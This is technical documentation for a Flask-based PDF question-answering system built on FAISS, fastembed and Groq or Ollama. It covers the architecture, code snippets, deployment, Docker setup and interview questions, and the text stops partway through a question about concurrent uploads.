# RAG Document Q&A — Complete Technical Documentation

> A production-ready Retrieval-Augmented Generation system built with Flask, FAISS, fastembed, and Groq/Ollama. Users upload PDFs and get AI-powered, streamed answers grounded in the actual document text — with source citations, multi-turn memory, and a mobile-responsive chat UI.

---

## Table of Contents

1. [What This Project Does](#1-what-this-project-does)
2. [Full Technology Stack](#2-full-technology-stack)
3. [System Architecture](#3-system-architecture)
4. [Project File Structure](#4-project-file-structure)
5. [RAG Pipeline — How It Works](#5-rag-pipeline--how-it-works)
6. [Backend Deep Dive](#6-backend-deep-dive)
7. [Frontend Deep Dive](#7-frontend-deep-dive)
8. [Streaming with SSE](#8-streaming-with-sse)
9. [Multi-Turn Conversation Memory](#9-multi-turn-conversation-memory)
10. [Vector Store Design](#10-vector-store-design)
11. [Deployment](#11-deployment)
12. [Docker](#12-docker)
13. [Interview Questions & Answers](#13-interview-questions--answers)

---

## 1. What This Project Does

Users upload PDF documents through a drag-and-drop interface. The system:

1. Extracts text from every page of the PDF
2. Splits text into overlapping chunks (~1000 characters with 200-char overlap)
3. Converts every chunk into a 384-dimensional vector embedding using an ONNX model
4. Stores those vectors in a FAISS index (persisted to disk)
5. When the user asks a question, embeds the question the same way
6. Finds the 5 most semantically similar chunks using cosine similarity
7. Builds a messages array (system + conversation history + question)
8. Streams the LLM's answer back token-by-token via Server-Sent Events
9. Displays the answer in a chat UI with source citations, copy button, and export

### Feature List

| Feature | Description |
|---|---|
| PDF upload | Drag-and-drop or file picker, up to 50 MB |
| Document indexing | Automatic text extraction, chunking, embedding, FAISS storage |
| Upload summary | LLM auto-generates a 2–3 sentence summary on upload |
| Streaming answers | Tokens appear word-by-word — no waiting for full response |
| Source citations | Each answer shows which document/page it came from |
| Multi-turn memory | Last 6 Q&A turns are sent as context — follow-up questions work |
| New Conversation | Clears chat and resets memory |
| Copy answer | One-click clipboard copy on each AI response |
| Export chat | Downloads full conversation as a Markdown file |
| Document filter | Restrict search to one specific PDF |
| Mobile responsive | Sidebar becomes a slide-out drawer on phones |
| Docker support | Full containerised setup with Ollama bundled |
| Cloud deployment | Render.com with Groq API |

---

## 2. Full Technology Stack

### Python Backend

| Library | Version | Role |
|---|---|---|
| **Flask** | 3.x | Web framework — handles HTTP routing, request parsing, SSE streaming |
| **gunicorn** | 21.x | Production WSGI server — replaces Flask's dev server for deployment |
| **pdfplumber** | 0.11.x | PDF text extraction per page (wraps pdfminer.six, handles tables/columns) |
| **fastembed** | 0.8.x | ONNX-based text embeddings — `BAAI/bge-small-en-v1.5` model, 384 dims |
| **faiss-cpu** | 1.8.x | Facebook AI Similarity Search — brute-force cosine similarity at scale |
| **requests** | 2.x | HTTP client for Groq API calls and Ollama REST API |
| **numpy** | 2.x | Float32 array operations on embedding vectors |
| **werkzeug** | 3.x | `secure_filename` for safe file upload path handling |

### Frontend

| Technology | Role |
|---|---|
| **HTML5** | Semantic page structure — `<aside>`, `<main>`, `<textarea>` |
| **CSS3** | Flexbox layout, CSS variables, media queries, animations |
| **Vanilla JavaScript (ES2022)** | Fetch API, ReadableStream SSE reader, async/await |

### AI / ML Services

| Component | Tool | Why chosen |
|---|---|---|
| Text Embeddings | `BAAI/bge-small-en-v1.5` via fastembed | ONNX runtime — no PyTorch, ~100 MB RAM vs ~500 MB |
| Vector Search | FAISS `IndexFlatIP` | Exact cosine similarity, zero external service needed |
| LLM (cloud) | Groq API | Fastest free LLM inference (~500 tokens/sec), OpenAI-compatible |
| LLM (local) | Ollama `/api/chat` | Fully offline, same messages format as Groq |

### Groq Models Available

| Model ID in app | Groq API Model | Character |
|---|---|---|
| `llama3.1-8b` | `llama-3.1-8b-instant` | Fast, free, great for most Q&A |
| `llama3.3-70b` | `llama-3.3-70b-versatile` | Most capable, still free |
| `gemma2-9b` | `gemma2-9b-it` | Google's model, good reasoning |

### DevOps

| Tool | Role |
|---|---|
| **Git + GitHub** | Version control, PR workflow |
| **Docker** | Container packaging of the Flask app |
| **docker-compose** | Orchestrates Flask app + Ollama service together |
| **Render.com** | Cloud PaaS — auto-deploys on push to `main` |

---

## 3. System Architecture

### High-Level Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                        BROWSER (Client)                         │
│  ┌─────────────────┐   ┌────────────────────────────────────┐   │
│  │  Sidebar        │   │  Chat Panel                        │   │
│  │  ─ Upload zone  │   │  ─ Streaming SSE consumer          │   │
│  │  ─ Model select │   │  ─ Conversation history (JS array) │   │
│  │  ─ Doc filter   │   │  ─ Copy / Export / New Chat        │   │
│  │  ─ Doc list     │   │  ─ Source citations                │   │
│  └────────┬────────┘   └──────────────┬─────────────────────┘   │
└───────────┼──────────────────────────┼─────────────────────────┘
            │ POST /upload              │ POST /ask/stream
            ▼                           ▼
┌─────────────────────────────────────────────────────────────────┐
│                      FLASK  (app.py)                            │
│                                                                 │
│  /upload → process_pdf → embed_texts → store.add_document       │
│                                            ↓                    │
│  /ask/stream → embed_query → store.search → stream_answer       │
│                                            ↓                    │
│                                     SSE token stream            │
└──────────────────────────┬──────────────────────────────────────┘
                           │
          ┌────────────────┼──────────────────┐
          ▼                ▼                  ▼
   ┌─────────────┐  ┌──────────────┐  ┌─────────────────┐
   │  fastembed  │  │    FAISS     │  │  Groq API /     │
   │  ONNX model │  │  IndexFlatIP │  │  Ollama local   │
   │  384-dim    │  │  disk-backed │  │  streaming LLM  │
   └─────────────┘  └──────────────┘  └─────────────────┘
```

### Request Flow: Uploading a PDF

```
User drops PDF
      │
      ▼
POST /upload  (multipart/form-data)
      │
      ▼
secure_filename()       ← sanitise filename (prevent path traversal)
      │
      ▼
pdfplumber.open()       ← extract text page by page
      │
      ▼
chunk_text(1000, 200)   ← sliding window chunks with overlap
      │
      ▼
fastembed.embed()       ← 384-dim float32 vectors, normalised
      │
      ▼
faiss.IndexFlatIP.add() ← append vectors to in-memory index
      │
      ▼
write_index() + json    ← persist to vectorstore/ on disk
      │
      ▼
summarize_document()    ← LLM generates 2-3 sentence summary
      │
      ▼
JSON response: {doc_id, name, page_count, chunk_count, summary}
```

### Request Flow: Asking a Question

```
User types question → Enter
      │
      ▼
POST /ask/stream  {question, model, history[], doc_id}
      │
      ▼
embed_query(question)       ← same model, same 384-dim space
      │
      ▼
FAISS.search(vec, k=15)     ← top-15 candidates by inner product
      │
      ▼
Filter: skip deleted docs, skip non-matching doc_id filter
→ top 5 relevant chunks
      │
      ▼
Build messages[]:
  [{role:"system", content: "Context:\n[chunk1]\n[chunk2]..."},
   {role:"user",   content: "previous Q"},    ← history
   {role:"asst",  content: "previous A"},    ← history
   {role:"user",  content: "current Q"}]
      │
      ▼
Groq API or Ollama (streaming=true)
      │
      ▼
Flask generator yields SSE events:
  data: {"type":"sources", "sources":[...]}
  data: {"type":"token",   "token":"The"}
  data: {"type":"token",   "token":" answer"}
  ...
  data: [DONE]
      │
      ▼
JS ReadableStream reader: appends each token to bubble live
```

---

## 4. Project File Structure

```
rag-document-qa/
│
├── app.py                      # Flask application — all HTTP routes
│
├── rag/                        # Core RAG logic (pure Python)
│   ├── __init__.py
│   ├── document_processor.py   # PDF extraction + chunking
│   ├── embeddings.py           # fastembed wrapper (singleton model)
│   ├── vector_store.py         # FAISS index + metadata management
│   └── llm.py                  # Groq + Ollama streaming integration
│
├── templates/
│   └── index.html              # Single-page app shell
│
├── static/
│   ├── style.css               # All styling (desktop + mobile responsive)
│   └── app.js                  # All frontend logic
│
├── uploads/                    # Temporary PDF storage (deleted after indexing)
├── vectorstore/                # Persisted FAISS index + metadata JSON
│
├── Dockerfile                  # Container definition
├── docker-compose.yml          # Flask app + Ollama orchestration
├── render.yaml                 # Render.com deployment config
├── requirements.txt            # Python dependencies
└── .gitignore                  # Excludes uploads/, vectorstore/, venv/
```

---

## 5. RAG Pipeline — How It Works

RAG stands for **Retrieval-Augmented Generation**. The idea: instead of relying on an LLM's trained memory (which is stale and can hallucinate), you *retrieve* relevant text from your own documents at query time and *augment* the LLM's prompt with it so it *generates* a grounded answer.

### Why RAG beats fine-tuning for document Q&A

| | Fine-tuning | RAG |
|---|---|---|
| Cost | Thousands of dollars | Cents per query |
| Update documents | Retrain the model | Upload a new PDF |
| Explainability | Black box | Shows exact source chunks |
| Hallucination risk | High (memorised facts) | Low (grounded in text) |
| Latency | Low (model has knowledge baked in) | Slight overhead for retrieval |

### Phase 1 — Indexing (on PDF upload)

**Step 1: Text Extraction**
`pdfplumber` opens the PDF and iterates every page. It uses pdfminer under the hood, which parses the PDF's internal object stream and reconstructs text with proper word spacing. It handles multi-column layouts and embedded fonts better than simpler tools like PyPDF2.

```python
with pdfplumber.open(filepath) as pdf:
    for i, page in enumerate(pdf.pages):
        text = page.extract_text()          # handles layout, columns, fonts
        pages.append({"page": i + 1, "text": text.strip()})
```

**Step 2: Chunking**
LLMs have context windows (e.g. 8192 tokens). A 100-page PDF can be 100k tokens — too large to send in one go. We split into 1000-character overlapping chunks:

```python
def chunk_text(text, chunk_size=1000, overlap=200):
    chunks = []
    start = 0
    while start < len(text):
        chunks.append(text[start : start + chunk_size])
        start += chunk_size - overlap     # slide back by overlap
    return chunks
```

The `overlap=200` means each chunk starts 200 characters before where the previous chunk ended. A sentence split across a boundary will appear complete in at least one chunk.

**Step 3: Embedding**
Each chunk is converted into a 384-dimensional float32 vector using `BAAI/bge-small-en-v1.5` via fastembed. The vectors are L2-normalised (unit length).

```python
embeddings = list(model.embed(texts))       # generator → list
return np.array(embeddings, dtype=np.float32)   # shape: (N, 384)
```

L2-normalisation is important: with unit-length vectors, the inner product equals cosine similarity. FAISS `IndexFlatIP` computes inner products, so we get cosine similarity for free without extra math.

**Step 4: FAISS Storage**
Vectors are added to the in-memory index and immediately written to disk:

```python
self.index.add(embeddings)          # add to FAISS
faiss.write_index(self.index, "vectorstore/index.faiss")
json.dump({"chunks": ..., "documents": ...}, f)  # save metadata
```

### Phase 2 — Retrieval (on each question)

The user's question gets embedded with the same model into the same 384-dimensional space:

```python
query_vec = embed_query(question)   # shape: (384,)
scores, indices = index.search(query_vec.reshape(1,-1), k=15)
```

FAISS returns the top 15 candidate indices sorted by inner product (cosine similarity). We then filter:
- Skip indices whose `doc_id` is not in the active documents dict (soft-deleted)
- Skip indices not matching the user's document filter (if set)
- Return top 5

### Phase 3 — Generation (LLM call)

Retrieved chunks + conversation history are formatted into a messages array and streamed to the LLM:

```python
messages = [
    {"role": "system",    "content": f"Context:\n{formatted_chunks}"},
    {"role": "user",      "content": "prev question"},   # history
    {"role": "assistant", "content": "prev answer"},     # history
    {"role": "user",      "content": question},          # current
]
```

The LLM's response is streamed token-by-token back to the browser via SSE.

---

## 6. Backend Deep Dive

### `rag/document_processor.py`

Responsible for transforming a raw PDF file into a list of chunk dicts ready for embedding.

```python
# Each chunk looks like:
{
    "id": "uuid4-string",
    "doc_id": "uuid4-string",       # parent document identifier
    "doc_name": "research.pdf",     # display name
    "page": 3,                      # original page number (for citations)
    "text": "The results show...",  # chunk content
    "faiss_idx": 142                # position in FAISS index
}
```

Key decisions:
- `uuid4` for IDs — globally unique without coordination
- Page number stored per chunk — enables "Source: page 3" citations
- `faiss_idx` stored in chunk — maps FAISS vector position back to metadata

### `rag/embeddings.py`

Uses a **lazy singleton** pattern for the model:

```python
_model = None

def get_model():
    global _model
    if _model is None:
        _model = TextEmbedding("BAAI/bge-small-en-v1.5")   # loads once
    return _model
```

Why lazy? Loading the ONNX model takes ~2 seconds. If we loaded it at import time, every gunicorn worker restart would pay this cost before serving any request. Lazy loading defers it to the first actual request.

**Why fastembed over sentence-transformers?**

`sentence-transformers` requires PyTorch (~450 MB). On Render's free tier (512 MB RAM), PyTorch alone exceeds the memory limit and causes OOM crashes. `fastembed` uses ONNX Runtime instead — same embedding quality, ~100 MB RAM.

### `rag/vector_store.py`

The VectorStore class manages three things:
1. The FAISS index (vectors)
2. The chunks list (metadata, mirrors FAISS positions)
3. The documents dict (active document registry)

**Soft-delete design:**

FAISS has no native delete. The trick: `documents` is an allowlist. When a document is deleted, its entry is removed from `documents`. The vectors stay in FAISS, but the search function skips any chunk whose `doc_id` is not in `documents`:

```python
def search(self, query_embedding, k=5, doc_id=None):
    scores, indices = self.index.search(query_vec, k * 4)
    results = []
    for score, idx in zip(scores[0], indices[0]):
        chunk = self.chunks[idx]
        if chunk["doc_id"] not in self.documents:
            continue        # soft-deleted — invisible
        if doc_id and chunk["doc_id"] != doc_id:
            continue        # filtered to a specific document
        results.append({**chunk, "score": float(score)})
        if len(results) >= k:
            break
    return results
```

**Why `chunks` is never shrunk:**

`chunks[faiss_idx]` must always map to the correct metadata. If we removed elements from `chunks`, all subsequent indices would shift and produce wrong metadata. So deleted document chunks stay in `chunks` — they just become invisible because their `doc_id` isn't in `documents`.

**Persistence:**

```
vectorstore/
  index.faiss     ← binary float32 matrix (FAISS format)
  metadata.json   ← {"chunks": [...], "documents": {...}}
```

FAISS handles only the raw numbers. All text, filenames, page numbers live in `metadata.json`. The bridge between them is `chunk["faiss_idx"]` — the position in the FAISS index.

### `rag/llm.py`

Supports two backends transparently based on the `GROQ_API_KEY` environment variable:

```python
def stream_answer(question, context_chunks, model, history=None):
    messages = _build_messages(question, context_chunks, history)
    groq_key = os.environ.get("GROQ_API_KEY")
    if groq_key:
        yield from _stream_groq(messages, GROQ_MODELS[model], groq_key)
    else:
        yield from _stream_ollama(messages, model)
```

**Groq streaming — parsing SSE:**

Groq returns OpenAI-compatible SSE:
```
data: {"choices":[{"delta":{"content":"The"}}]}
data: {"choices":[{"delta":{"content":" answer"}}]}
data: [DONE]
```

```python
for line in resp.iter_lines():
    if not line.startswith(b"data: "):
        continue
    payload = line[6:]
    if payload == b"[DONE]":
        break
    token = json.loads(payload)["choices"][0]["delta"].get("content", "")
    if token:
        yield token
```

**Ollama streaming — NDJSON:**

Ollama returns newline-delimited JSON:
```
{"message":{"content":"The"},"done":false}
{"message":{"content":" answer"},"done":false}
{"message":{"content":""},"done":true}
```

```python
for line in resp.iter_lines():
    data = json.loads(line)
    token = data.get("message", {}).get("content", "")
    if token:
        yield token
    if data.get("done"):
        break
```

Both backends use the same `messages` array format. This is the key architectural decision that enables easy swapping.

**Mistral fix:**
Groq deprecated `mixtral-8x7b-32768` in early 2025. The GROQ_MODELS dict maps the old UI names to currently supported model IDs:
```python
GROQ_MODELS = {
    "llama3.1-8b":  "llama-3.1-8b-instant",
    "llama3.3-70b": "llama-3.3-70b-versatile",
    "gemma2-9b":    "gemma2-9b-it",
}
```

### `app.py`

Flask routes:

| Route | Method | Purpose |
|---|---|---|
| `/` | GET | Serve the HTML page |
| `/health` | GET | Render health check |
| `/documents` | GET | List indexed documents |
| `/upload` | POST | Upload + index PDF, return summary |
| `/ask/stream` | POST | SSE streaming Q&A endpoint |
| `/documents/<id>` | DELETE | Soft-delete a document |
| `/models` | GET | Return available models (Groq or Ollama) |

**Key app design decisions:**

1. **Module-level singleton**: `store = VectorStore()` is created once at startup. All requests share the same in-memory FAISS index. This is why gunicorn uses `--workers 1` — multiple workers would each have their own index and see inconsistent state.

2. **File cleanup in `finally`**: The raw PDF is deleted immediately after indexing regardless of success or failure. The system never stores raw documents — only the extracted text chunks.

3. **SSE response headers**:
```python
headers={
    "Cache-Control": "no-cache",
    "X-Accel-Buffering": "no",     # disables Nginx response buffering
    "Connection": "keep-alive",
}
```
The `X-Accel-Buffering: no` header is critical for Render/Nginx deployments. Without it, the reverse proxy buffers the entire SSE stream and delivers it all at once — defeating the purpose of streaming.

---

## 7. Frontend Deep Dive

### Layout

```css
.app {
    display: flex;         /* horizontal split */
    height: 100dvh;        /* dynamic viewport height — adjusts with mobile keyboard */
}

.sidebar  { width: 320px; flex-shrink: 0; }  /* fixed width */
.chat-area { flex: 1; }                       /* takes remaining space */
```

`100dvh` (dynamic viewport height) is used instead of `100vh`. On mobile browsers, `100vh` includes the browser chrome (address bar, navigation bar). When the keyboard opens, `100vh` doesn't shrink, pushing the input bar below the visible area. `100dvh` adjusts in real time.

### Mobile Responsive (≤640px)

```css
@media (max-width: 640px) {
    .sidebar {
        position: fixed;      /* removed from normal flow */
        left: -320px;         /* hidden off-screen */
        z-index: 100;
        transition: left .25s ease;
    }
    .sidebar.open { left: 0; }   /* slides in on hamburger tap */
    .chat-area { width: 100%; }  /* fills full screen */
    .menu-btn { display: flex; } /* show hamburger */
}
```

The sidebar is hidden via `position: fixed` + `left: -320px`. Since it's removed from the normal flow, `.chat-area` naturally fills 100% width. The overlay (`position: fixed; inset: 0; background: rgba(0,0,0,.5)`) appears behind the sidebar and closes it on tap.

### iPhone Safe Area

```css
.chat-input-area {
    padding-bottom: max(14px, env(safe-area-inset-bottom));
}
```

`env(safe-area-inset-bottom)` is a CSS environment variable set by iOS Safari to the height of the iPhone home indicator (the swipe bar at the bottom of Face ID iPhones). Without this, the input bar overlaps with the home indicator.

### Streaming in JavaScript

`EventSource` only supports GET requests. Since we need POST (to send question + history in the body), we use `fetch()` with a `ReadableStream` reader:

```javascript
const resp = await fetch('/ask/stream', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ question, model, history, doc_id }),
});

const reader = resp.body.getReader();
const decoder = new TextDecoder();
let buffer = '';

while (true) {
    const { done, value } = await reader.read();
    if (done) break;

    buffer += decoder.decode(value, { stream: true });
    const lines = buffer.split('\n');
    buffer = lines.pop();       // keep the incomplete last line

    for (const line of lines) {
        if (!line.startsWith('data: ')) continue;
        const raw = line.slice(6);
        if (raw === '[DONE]') return;

        const parsed = JSON.parse(raw);
        if (parsed.type === 'token') {
            fullAnswer += parsed.token;
            bubbleEl.textContent = fullAnswer;  // live update
            scrollToBottom();
        }
    }
}
```

**The buffer accumulation pattern** is necessary because network packets arrive in arbitrary sizes. One `reader.read()` call might return half a line or five lines. The `lines.pop()` keeps the incomplete last fragment in `buffer` to be prepended to the next chunk.

### Conversation History

```javascript
let conversationHistory = [];   // [{question: "...", answer: "..."}]

// After each answer completes:
conversationHistory.push({ question, answer: fullAnswer });
if (conversationHistory.length > 6) conversationHistory.shift();  // cap at 6
```

Capped at 6 turns because each turn adds ~500 tokens to the LLM prompt. 6 turns ≈ 3000 tokens of history, which fits safely within the 8192-token context window alongside the retrieved chunks and system prompt.

### XSS Prevention

All user-supplied content (document names, LLM answers from PDFs) is escaped before insertion into the DOM:

```javascript
function esc(str) {
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')    // prevents <script> injection
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
}
```

For streaming text we use `element.textContent = text` (not `innerHTML`) — `textContent` never interprets HTML, making it inherently XSS-safe.

---

## 8. Streaming with SSE

**Server-Sent Events (SSE)** is an HTTP protocol where the server keeps a connection open and pushes data as it becomes available:

```
HTTP/1.1 200 OK
Content-Type: text/event-stream
Cache-Control: no-cache

data: {"type":"sources","sources":[...]}\n\n
data: {"type":"token","token":"The"}\n\n
data: {"type":"token","token":" answer"}\n\n
data: [DONE]\n\n
```

Each event is `data: <payload>\n\n` (double newline terminates the event).

**Flask generator pattern:**

```python
def generate():
    yield f"data: {json.dumps({'type':'sources','sources':sources})}\n\n"
    for token in stream_answer(question, chunks, model, history):
        yield f"data: {json.dumps({'type':'token','token':token})}\n\n"
    yield "data: [DONE]\n\n"

return Response(
    stream_with_context(generate()),
    mimetype="text/event-stream"
)
```

`stream_with_context` keeps the Flask request context alive for the duration of the generator. Without it, Flask tears down the request context before the generator finishes.

**Why streaming matters for UX:**

A 200-token answer at 100 tokens/sec takes 2 seconds. Without streaming: user stares at a spinner for 2 seconds. With streaming: they start reading immediately, the answer feels instant. Perceived latency drops from 2 seconds to ~100ms (first token).

---

## 9. Multi-Turn Conversation Memory

Without memory, every question is independent:
- Q: "Who wrote this paper?"  A: "Dr. Smith"
- Q: "What did he conclude?" ← LLM doesn't know who "he" is

With memory, the last 6 Q&A turns are sent as part of the messages array:

```python
messages = [
    {"role": "system",    "content": "Context:\n[retrieved chunks]"},
    {"role": "user",      "content": "Who wrote this paper?"},
    {"role": "assistant", "content": "Dr. Smith."},
    {"role": "user",      "content": "What did he conclude?"},  ← current
]
```

The LLM understands "he" = Dr. Smith from the previous turn.

**Why cap at 6 turns?**

Context window budget breakdown for `llama-3.1-8b-instant` (8192 tokens):
- System prompt + context chunks: ~2000 tokens
- 6 turns of history: ~3000 tokens
- Current question: ~50 tokens
- LLM answer: ~500 tokens
- Buffer: ~642 tokens
- Total: ~6192 tokens — safely within 8192

Going beyond 6 turns risks a context overflow error, especially with long answers.

---

## 10. Vector Store Design

### Why FAISS?

| Requirement | FAISS | Alternative |
|---|---|---|
| No external service | ✓ Local library | ✗ Pinecone/Qdrant need a server |
| Exact search for small datasets | ✓ IndexFlatIP | ✗ Approximate methods add complexity |
| Disk persistence | ✓ `write_index` / `read_index` | Varies |
| Python bindings | ✓ `faiss-cpu` | ✓ Most alternatives |
| Free | ✓ MIT licence | Some are paid |

### Why `IndexFlatIP`?

`IndexFlatIP` = brute-force inner product search.

With L2-normalised vectors (unit length), inner product = cosine similarity:
```
cos(θ) = A·B / (|A||B|)  →  when |A|=|B|=1  →  cos(θ) = A·B
```

**Time complexity:** O(N × D) per query, where N = number of vectors, D = 384 dimensions.

For this project (few thousand chunks from uploaded PDFs), brute-force search is < 1ms. Approximate methods (HNSW, IVF) only make sense above ~100k vectors.

### Cosine vs Euclidean Distance

Cosine similarity is preferred for text embeddings because it's **magnitude-invariant**. A short chunk and a long chunk on the same topic have similar directions but different magnitudes. Cosine only cares about direction (angle), so they score equally. Euclidean distance would penalise the shorter chunk unfairly.

### Soft-Delete Trade-Off

**Pro:** Zero complexity. Deleted vectors stay in FAISS; search just filters them out.

**Con:** Over time, "ghost" vectors accumulate, slightly increasing search time (more candidates to filter). For a demo/portfolio app with a few dozen documents, this is negligible. In production you'd periodically compact the index by rebuilding it without deleted vectors.

---

## 11. Deployment

### Render.com (cloud — free tier)

**How it works:**
1. You push to the `main` branch on GitHub
2. Render detects the push (via webhook), clones the repo, runs the build command
3. Replaces the running container with the new build

**`render.yaml` config:**
```yaml
services:
  - type: web
    name: rag-document-qa
    runtime: python
    buildCommand: pip install -r requirements.txt
    startCommand: gunicorn app:app --bind 0.0.0.0:$PORT --timeout 120 --workers 1
    healthCheckPath: /health
    envVars:
      - key: GROQ_API_KEY
        sync: false      # set manually in Render dashboard (never in git)
```

**Render free tier constraints:**
- 512 MB RAM — fine with fastembed; exceeded with sentence-transformers
- Spins down after 15 min inactivity — first request after idle takes ~30s
- Ephemeral filesystem — vectorstore resets on every deploy/restart
- `PORT` env var is auto-injected by Render — that's why `app.run(port=int(os.environ.get("PORT", 5000))))`

**Why `--workers 1`:**
The VectorStore is a Python module-level object. Multiple gunicorn workers each get their own copy via `fork()`. User A uploads to worker 1's index; user B queries worker 2's empty index — inconsistent state. Single worker eliminates this.

### Environment Variables

| Variable | Where | Value |
|---|---|---|
| `GROQ_API_KEY` | Render dashboard | Your key from console.groq.com |
| `PORT` | Auto-set by Render | Typically 10000 |

**Never commit API keys to git.** Use environment variables only.

---

## 12. Docker

### Dockerfile

```dockerfile
FROM python:3.11-slim        # slim = smaller base, no dev tools
WORKDIR /app

RUN apt-get update && apt-get install -y --no-install-recommends \
    build-essential \        # needed to compile some Python C extensions
    && rm -rf /var/lib/apt/lists/*    # clear apt cache to reduce image size

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt   # no cache = smaller image

COPY . .
RUN mkdir -p uploads vectorstore

EXPOSE 5000
CMD ["gunicorn", "app:app", "--bind", "0.0.0.0:5000", "--timeout", "120", "--workers", "1"]
```

**Layer caching — the order matters:**

```dockerfile
COPY requirements.txt .         ← layer A (changes rarely)
RUN pip install ...             ← layer B (re-runs only if A changed)
COPY . .                        ← layer C (changes on every code edit)
```

If you copied all files first, every code change would invalidate the pip layer and reinstall all packages. This ordering means `pip install` only re-runs when `requirements.txt` changes — saving minutes per build.

### docker-compose.yml

```yaml
services:
  app:
    build: .
    ports: ["5000:5000"]
    environment:
      - GROQ_API_KEY=${GROQ_API_KEY:-}   # from .env file or host env
    volumes:
      - vectorstore_data:/app/vectorstore  # FAISS index persists across restarts

  ollama:
    image: ollama/ollama          # official image
    ports: ["11434:11434"]
    volumes:
      - ollama_data:/root/.ollama  # model weights persist across restarts

volumes:
  vectorstore_data:
  ollama_data:
```

**Named volumes** vs bind mounts:
- Bind mount: `./vectorstore:/app/vectorstore` — maps a host directory
- Named volume: `vectorstore_data:/app/vectorstore` — Docker manages the storage

Named volumes survive `docker compose down` and work across platforms (no Windows/Linux path issues). Bind mounts are easier to inspect on the host filesystem.

**Run with Docker:**
```bash
docker compose up --build
docker compose exec ollama ollama pull llama3.2   # first time only
# App at http://localhost:5000
```

---

## 13. Interview Questions & Answers

---

### Section A — RAG & AI Fundamentals

---

**Q1. What is RAG? Explain it to a non-technical interviewer.**

**A:** RAG stands for Retrieval-Augmented Generation. Imagine you're giving an open-book exam instead of a closed-book exam. The LLM is the student. Without RAG, the student answers from memory (training data) — they might misremember or make things up. With RAG, the student can look up your specific documents before answering. They find the relevant pages, read them, then write an answer based on what they just read. The answer is grounded in your actual documents, not the AI's memorised knowledge.

---

**Q2. What are vector embeddings? What does a 384-dimensional vector represent?**

**A:** An embedding is a fixed-size list of numbers that captures the *meaning* of text. Texts with similar meanings end up as vectors pointing in similar directions in a 384-dimensional space.

The 384 dimensions don't individually mean anything interpretable — they're learned latent features encoding things like topic, sentiment, and entity types. Together they form a unique "fingerprint" of the text's meaning.

Example: "dog" and "puppy" produce very similar vectors. "dog" and "inflation rate" produce very different vectors — even though they share no characters.

**Why 384?** It's a balance: enough dimensions to capture rich semantics (~90% of what 1536-dim models capture), but 4× cheaper in memory and compute.

---

**Q3. Explain cosine similarity. Why is it preferred over Euclidean distance for text?**

**A:** Cosine similarity measures the angle between two vectors:

```
similarity = (A · B) / (|A| × |B|)
```

Range: -1 (opposite meaning) to +1 (same meaning).

Euclidean distance measures the straight-line distance between two points.

**Why cosine for text:**

Longer text naturally produces vectors with larger magnitudes. "The dog ran" and "The golden retriever ran rapidly through the park chasing the ball" are about the same thing, but the longer sentence has a bigger vector. Euclidean distance would make them appear less similar just because of length. Cosine only cares about *direction* (angle), so it correctly identifies them as similar.

With L2-normalised vectors (unit length), inner product = cosine similarity, and FAISS `IndexFlatIP` computes this very efficiently.

---

**Q4. What is chunking and how do you choose chunk size?**

**A:** Chunking splits a long document into smaller pieces that can be:
1. Individually embedded (LLMs work on limited text at a time)
2. Individually retrieved (only relevant chunks are sent to the LLM)

**Chunk size trade-offs:**

| Small (200–400 chars) | Large (1000–2000 chars) |
|---|---|
| Precise retrieval | More context per retrieved chunk |
| Risk missing context | Risk including irrelevant text |
| More chunks = slower index | Fewer chunks = faster index |
| Good for: fact lookup | Good for: reasoning tasks |

This project uses **1000 chars with 200-char overlap**. The overlap prevents information loss at boundaries — a sentence split across a boundary appears complete in at least one chunk.

---

**Q5. What causes hallucinations in LLMs and how does RAG reduce them?**

**A:** Hallucinations happen when the LLM generates confident-sounding text that isn't in its training data or conflicts with reality. Causes:
1. Training data didn't include the specific fact
2. Model "interpolated" between similar training examples
3. Temperature too high → more creative, less factual
4. Prompt didn't constrain the model to known information

**How RAG reduces hallucinations:**
1. **Grounding instruction** in system prompt: "Answer based solely on the context above"
2. **Low temperature** (0.3) → more deterministic, less creative
3. **Source citations** → users can verify
4. **Fallback instruction**: "If context lacks information, say so" → model admits uncertainty rather than fabricating

---

**Q6. What is the difference between bi-encoder and cross-encoder models?**

**A:**

**Bi-encoder** (what this project uses):
- Two separate passes: encode document chunks once at index time, encode the query at query time
- Similarity = dot product of the two vectors
- Fast: O(1) per candidate (dot product of pre-computed vectors)
- Used for: initial retrieval from millions of candidates

**Cross-encoder** (reranking):
- Takes (query, chunk) pair as a single input
- Attends to both together — much better at understanding relevance
- Slow: must re-run the model for every (query, chunk) pair
- Used for: reranking the top-20 bi-encoder results to top-5

**Production RAG pipeline:**
```
Query → bi-encoder → top-100 candidates (fast)
     → cross-encoder → rerank → top-5 (accurate)
     → LLM → final answer
```

This project uses bi-encoder only. Adding a cross-encoder reranker would significantly improve answer quality at the cost of ~200ms extra latency.

---

### Section B — System Design

---

**Q7. How does the soft-delete work in FAISS? What are the trade-offs?**

**A:** FAISS has no built-in delete. We use a registry-based soft delete:

1. `documents` dict = allowlist of active doc_ids
2. `chunks` list = never modified, preserves FAISS index alignment
3. On delete: remove doc_id from `documents` only
4. On search: skip any chunk whose doc_id is not in `documents`

```python
if chunk["doc_id"] not in self.documents:
    continue   # effectively deleted
```

**Trade-offs:**
- **Pro:** Simple, no index rebuild, O(1) delete
- **Con:** "Ghost" vectors accumulate in FAISS over time, slightly increasing search time

**Production fix:** Periodically compact the index — rebuild it from scratch including only active chunks. Schedule this as a background job during low-traffic periods.

---

**Q8. Why `--workers 1` in gunicorn? How would you scale to multiple workers?**

**A:** `store = VectorStore()` is a Python module-level object. When gunicorn forks multiple workers, each gets its own copy of `store` via `fork()`. Worker 1 uploads a document into its FAISS index; worker 2 knows nothing about it — its index is empty. Queries sent to worker 2 would fail or return wrong results.

**To scale to multiple workers:**
1. Replace FAISS (in-process) with a shared vector database — Qdrant, Pinecone, or Weaviate running as a separate service
2. All Flask workers query the external service — shared state
3. Move document metadata from JSON to PostgreSQL — shared, atomic writes

```
Worker 1 ┐
Worker 2 ├──→ Qdrant (shared) → vectors
Worker 3 ┘         ↑
                 PostgreSQL (shared) → metadata
```

---

**Q9. How would you handle concurrent PDF uploads from multiple users?**

**A:** The current upload endpoint is synchronous. For large PDFs, `embed_texts()` can take 30+ seconds. During this time, the single gunicorn worker is blocked.

**Fix — async task queue:**

```
POST /upload → validates file → enqueues task → returns {task_id}

